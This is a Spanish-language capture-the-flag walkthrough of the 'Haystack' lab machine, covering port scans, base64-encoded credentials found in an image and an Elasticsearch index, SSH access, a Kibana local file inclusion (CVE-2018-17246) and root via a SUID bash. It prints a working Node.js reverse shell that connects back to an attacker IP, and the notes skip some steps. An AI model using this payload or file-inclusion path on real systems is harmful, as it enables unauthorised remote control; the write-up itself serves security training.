# Máquina Haystack

### Intrusión

Comenzamos con nuestros comandos de nmap

```
sudo nmap -p- --open -sS -n -Pn --min-rate 5000 -vvv 10.10.10.115 -oG allPorts
```
```
sudo nmap -p22,80,9200 -sCV 10.10.10.115 -oN Targeted
```
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 23:39 CEST
Nmap scan report for 10.10.10.115
Host is up (0.042s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2a8de2928b14b63fe42f3a4743238b2b (RSA)
|   256 e75a3a978e8e728769a30dd100bc1f09 (ECDSA)
|_  256 01d259b2660a9749205f1c84eb81ed95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.12.2
9200/tcp open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: DELETE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds
```
Encontramos una imagen al entrar en el puerto 80

Nos la descargamos y la movemos a nuestro directorio de trabajo
```
mv ~/Downloads/Descargas/needle.jpg .
```

Si usamos exiftool no encontramos gran cosa:


*ExifTool Version Number         : 12.16*
*File Name                       : needle.jpg*
*Directory                       : .*
*File Size                       : 179 KiB*
*File Modification Date/Time     : 2023:04:21 23:42:24+02:00*
*File Access Date/Time           : 2023:04:21 23:42:24+02:00*
*File Inode Change Date/Time     : 2023:04:21 23:42:38+02:00*
*File Permissions                : rw-r--r--*
*File Type                       : JPEG*
*File Type Extension             : jpg*
*MIME Type                       : image/jpeg*
*JFIF Version                    : 1.01*
*Exif Byte Order                 : Big-endian (Motorola, MM)*
*X Resolution                    : 96*
*Y Resolution                    : 96*
*Resolution Unit                 : inches*
*Software                        : paint.net 4.1.1*
*User Comment                    : CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 90.*
*Image Width                     : 1200*
*Image Height                    : 803*
*Encoding Process                : Baseline DCT, Huffman coding*
*Bits Per Sample                 : 8*
*Color Components                : 3*
*Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)*
*Image Size                      : 1200x803*
*Megapixels                      : 0.964*


Si aplicamos el comando string sin embargo:

```
strings -n 10 needle.jpg
```
Encontramos una cadena en base 64:

*bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==*

La decodeamos:

```
echo 'bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==' | base64 -d
```

Y encontramos que: `"la aguja en el pajar es "clave"%"`

Aplicando fuzzing en el puerto 80 no encontramos nada

Sin embargo en el puerto 9200:

```
wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.115:9200/FUZZ
```

*000000687:   200        0 L      1 W        338 Ch      "quotes"*

*000003642:   200        0 L      1 W        1010 Ch     "bank"*

*000007004:   200        0 L      1 W        2 Ch        "*checkout*"*    

*000016413:   200        0 L      1 W        4136 Ch     "*"*   

*000015463:   200        0 L      1 W        2 Ch        "*docroot*"*

Con una búsqueda de la tecnología que esta usando la API `Elasticsearch`, encontramos un método para listar todo el contenido de /quotes:

```
http://10.10.10.115:9200/quotes/_search?pretty=true&size=1000
```

Hay muchas líneas, quiero ver si de verdad hay una "key" o "clave" en el pajar:

```
curl 'http://10.10.10.115:9200/quotes/_search?pretty=true&size=1000' > haystack.txt
```

```
cat haystack.txt| grep "clave"
```
Encontramos cosas:

*"quote" : "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="*

*"quote" : "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "*

Si las decodeamos:

```
❯ echo 'cGFzczogc3BhbmlzaC5pcy5rZXk=' | base64 -d
```

`pass: spanish.is.key%`

```
❯ echo 'dXNlcjogc2VjdXJpdHkg' |base64 -d
```

`user: security %`

ssh connect

sudo -l nothing

[security@haystack home]$ cat /proc/net/tcp | grep '00000000:0000 0A'
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 38071 1 ffff93b16e2407c0 100 0 0 10 0                     
   1: 00000000:23F0 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 38070 1 ffff93b16e240f80 100 0 0 10 0                     
   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37910 1 ffff93b16e240000 100 0 0 10 0                     
   3: 0100007F:15E1 00000000:0000 0A 00000000:00000000 00:00000000 00000000   994        0 260693 1 ffff93b16e2464c0 100 0 0 10 0  
0.0.0.0:80
0.0.0.0:9200
0.0.0.0:22
127.0.0.1:5601

ssh> -L 5601:localhost:5601


https://github.com/mpgn/CVE-2018-17246

http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/kraken.js

[security@haystack tmp]$ cat kraken.js 
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.12", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
[security@haystack tmp]$ ls
hsperfdata_root  systemd-private-0e42240d40d449479f1827df5cdc85f1-chronyd.service-uWVFDs	vmware-root
jruby-6234	systemd-private-0e42240d40d449479f1827df5cdc85f1-elasticsearch.service-ux1hQZ	vmware-root_6238-700485133
kraken.js	systemd-private-0e42240d40d449479f1827df5cdc85f1-nginx.service-McmzxV
[security@haystack tmp]$ cat kraken.js 
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.12", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();



bash-4.2$ ls -la /bin/bash
-rwsr-xr-x. 1 root root 964608 oct 30  2018 /bin/bash

bash -p
whoami
root
